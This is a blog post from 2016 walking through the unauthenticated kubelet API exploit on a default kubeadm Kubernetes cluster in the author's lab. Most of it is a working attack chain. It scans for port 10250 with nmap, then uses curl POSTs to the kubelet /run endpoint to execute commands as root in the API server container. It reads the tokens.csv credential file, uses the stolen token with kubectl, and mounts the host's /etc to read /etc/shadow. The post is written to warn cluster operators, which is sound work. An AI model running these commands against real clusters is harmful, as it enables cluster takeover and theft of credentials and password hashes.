---
layout: post
title: "Kubernetes - From Container to Cluster"
date: 2016-10-08 10:05:39 +0100
comments: false
categories: Kubernetes
---

I've been reading up on Kubernetes a bit recently and [Jesse Hertz](https://twitter.com/killahertz_) pointed me at an interesting item around Kubernetes security that illustrates common problem of insecure defaults, so I thought it might be worth a post walking through the issue, mainly as a way for me to improve my Kubernetes knowledge but also could be useful for others who are deploying it.

---

**td;dr** if you can get access to the kubelet API port you can control the whole cluster and default configurations of Kubernetes are likely to make this possible, so be careful when setting up your clusters.

---

So the issue I wanted to look at is this [kubelet exploit](https://github.com/kayrus/kubelet-exploit).  Basically the kubelet is the service which runs on Kubernetes nodes and manages things like the docker installation on that node amongst other things.  It receives commands from the API server which co-ordinates the actions of the nodes in the cluster.

The security problem lies in the fact that by default the kubelet service listens on a TCP/IP port with no authentication or authorization control, so anyone who can reach that port at a network level can execute kubelet commands just by issuing HTTP requests to the service.

This means that an attacker who can get access to that port can basically take over the whole cluster pretty easily.  

The kubernetes team are well aware of this issue but a fix isn't planned until [Kubernetes 1.5](https://github.com/kubernetes/kubernetes/issues/11816)

There's also a workaround mentioned on the kubelet-exploit page which involves binding the kubelet to 127.0.0.1 and then connecting it to the kube-apiserver via SSH tunnels.

To explore this problem I followed the [kubeadm guide](http://kubernetes.io/docs/getting-started-guides/kubeadm/) from the kubernetes site.  Kubeadm is a tool which allows for clusters to be easily set up and appears to somewhat be modeled after some of the docker swarm commands.  

I followed the tutorial through to the point where I had a working cluster, taking all the defaults.

Then I deployed a container with some tools into the cluster, the scenario we're testing is that an attacker has gained access to a container in the cluster, and we'll see what they can do to take control of the cluster with only that access

```
kubectl run -i -t badcontainer --image=kalilinux/kali-linux-docker
```

which after a while for the image to download gives us a bash shell running in a container on the cluster.

So now we can scan round to see whether the port we're looking for is available.  

First add some tools to our build

```
apt update
apt install nmap curl
```

Then scan the network. In this case my main network where the nodes are installed is 192.168.41.0/24

```
nmap -sT -v -n -p10250 192.168.41.0/24
```

from that we get back a bunch of filtered ports but also three open ones which are the IP addresses of my kubernetes nodes.

```
Nmap scan report for 192.168.41.201
Host is up (0.00013s latency).
PORT      STATE SERVICE
10250/tcp open  unknown

Nmap scan report for 192.168.41.232
Host is up (0.000065s latency).
PORT      STATE SERVICE
10250/tcp open  unknown

Nmap scan report for 192.168.41.233
Host is up (0.00020s latency).
PORT      STATE SERVICE
10250/tcp open  unknown
```

Now we can use some of the kubectl commands mentioned in the exploit to start getting more access to the cluster.  First up lets enumerate our containers

```
curl -sk https://192.168.41.233:10250/runningpods/ | python -mjson.tool
```

This returns a list of the pods running on the node in JSON form, and also the images they're based on.  The most interesting one here is

```
      {
            "metadata": {
                "creationTimestamp": null,
                "name": "kube-apiserver-kube",
                "namespace": "kube-system",
                "uid": "0446d05fb9406214210e8d29397f8bf2"
            },
            "spec": {
                "containers": [
                    {
                        "image": "gcr.io/google_containers/kube-apiserver-amd64:v1.4.0",
                        "name": "kube-apiserver",
                        "resources": {}
                    },
                    {
                        "image": "gcr.io/google_containers/pause-amd64:3.0",
                        "name": "POD",
                        "resources": {}
                    }
                ]
            },

```
it's running the kube-apiserver image, so that'll be our API server.  As I mentioned earlier the API server is basically the heart of the cluster, so access to it provides a lot of control over the cluster itself.

```
curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=ls -la /"
```
lists the files in the root directory of that container and if we run 

```
curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=whoami"
```

We get back the answer that every pentester likes to see which is ```root``` !

So at this point, that's pretty bad news for the cluster owner.  A rogue container should not be able to execute privileged commands on the API server of the cluster.

So the next step in the attack would be to take over the cluster, for which the easiest way is likely to be getting control of the API server, as that lets us create new containers amongst other things.

if we do 

```
curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=ps -ef"
```
we can see the process list for the API server which handily provides the path of the token file that Kubernetes uses to authenticate access to the API

```
PID   USER     TIME   COMMAND
    1 root       2:29 /usr/local/bin/kube-apiserver --v=4 --insecure-bind-address=127.0.0.1 --etcd-servers=http://127.0.0.1:2379 --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota --service-cluster-ip-range=100.64.0.0/12 --service-account-key-file=/etc/kubernetes/pki/apiserver-key.pem --client-ca-file=/etc/kubernetes/pki/ca.pem --tls-cert-file=/etc/kubernetes/pki/apiserver.pem --tls-private-key-file=/etc/kubernetes/pki/apiserver-key.pem --token-auth-file=/etc/kubernetes/pki/tokens.csv --secure-port=443 --allow-privileged --etcd-servers=http://127.0.0.1:2379
```
here we can see that it's ```/etc/kubernetes/pki/tokens.csv```

so then we can just cat out that file

```
curl -k -XPOST "https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=cat /etc/kubernetes/pki/tokens.csv"
```
and we get the token which is the first field listed

```
d65ba5f070e714ab,kubeadm-node-csr,9738242e-8681-11e6-b5b4-000c29d33879,system:kubelet-bootstrap
```

Now we can communicate directly with the Kubernetes API like so

```
curl -k -X GET -H "Authorization: Bearer d65ba5f070e714ab" https://192.168.41.233
```

this gives us easier control of the cluster than we had from just running individual commands on it.  

We could persist with the HTTP API but TBH I find it easier to use kubectl, so we can just download that and point it at our cluster with our newly acquired token.

```
wget https://storage.googleapis.com/kubernetes-release/release/v1.4.0/bin/linux/amd64/kubectl
chmod +x kubectl
./kubectl config set-cluster test --server=https://192.168.41.233
./kubectl config set-credentials cluster-admin --token=d65ba5f070e714ab
```

From here, the next step it to look at getting access to the underlying nodes.  This can be achieved by mapping in a volume from the node to a container that we run.

so if we create a file called test-pod.yml

```
apiVersion: v1
kind: Pod
metadata:
  name: test-pd
spec:
  containers:
  - image: nginx
    name: test-container
    volumeMounts:
    - mountPath: /test-pd
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      # directory location on host
      path: /etc
```

and start it up with ```./kubectl create -f test-pod.yml```

we can then run a command to cat out the /etc/shadow file of the underlying node

```
./kubectl exec test-pd -c test-container cat /test-pd/shadow
```

From there it's just a bit of password cracking needed and we get shell access to the underlying node. 

So from that we can see that there's definitely something to think about if you're going to run a Kubernetes cluster in production, i.e. protect access to the kubectl API port...